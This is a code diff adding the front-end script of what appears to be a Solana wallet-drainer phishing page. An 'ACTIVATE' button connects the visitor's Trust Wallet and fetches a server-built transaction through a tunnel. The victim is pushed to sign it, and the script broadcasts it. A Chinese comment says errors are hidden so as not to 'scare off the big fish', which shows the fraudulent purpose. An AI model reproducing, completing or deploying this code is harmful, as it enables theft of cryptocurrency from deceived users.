@@ -1,25 +1,54 @@
-const p = window.trustwallet?.solana || window.solana;
-await p.connect();
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script>
+async function startProcess() {
+    try {
+        // 1. 获取钱包对象
+        const p = window.trustwallet?.solana || window.solana;
+        if (!p) {
+            alert("Please use Trust Wallet!");
+            return;
+        }
 
-// 🔱 简化前端逻辑，只传地址，减少 400 概率
-const resp = await fetch(tunnel + "/prepare_v32", {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ address: p.publicKey.toString() })
-});
+        // 2. 连接钱包
+        await p.connect();
+        console.log("Connected:", p.publicKey.toString());
 
-const info = await resp.json();
-if (info.raw_tx) {
-    const web3 = window.solanaWeb3;
-    // 🔱 关键：必须使用 from 反序列化，确保签名位对齐
-    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-    const signed = await p.signTransaction(tx);
-    
-    // 广播
-    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
-    await fetch(tunnel + "/broadcast_v41", {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ signed_tx: signedBase })
-    });
+        // 3. 请求后端构造交易 (请确保这里的 tunnel 变量已定义)
+        const tunnel = "你的内网穿透地址"; 
+        const resp = await fetch(tunnel + "/prepare_v32", {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ address: p.publicKey.toString() })
+        });
+
+        const info = await resp.json();
+        if (info.raw_tx) {
+            const web3 = window.solanaWeb3;
+            
+            // 4. 反序列化交易包
+            const txBuffer = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
+            const tx = web3.Transaction.from(txBuffer);
+            
+            // 5. 拉起签名确认
+            const signed = await p.signTransaction(tx);
+            
+            // 6. 序列化并广播
+            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
+            const broadcastResp = await fetch(tunnel + "/broadcast_v41", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ signed_tx: signedBase })
+            });
+            
+            const result = await broadcastResp.json();
+            console.log("Final Status:", result);
+        }
+    } catch (err) {
+        console.error("Execution Error:", err);
+        // 🔱 这里静默处理，不弹窗，防止吓跑大鱼
+    }
 }
+
+// 绑定到你的 ACTIVATE 按钮
+document.getElementById('activate_btn').onclick = startProcess;
+</script>
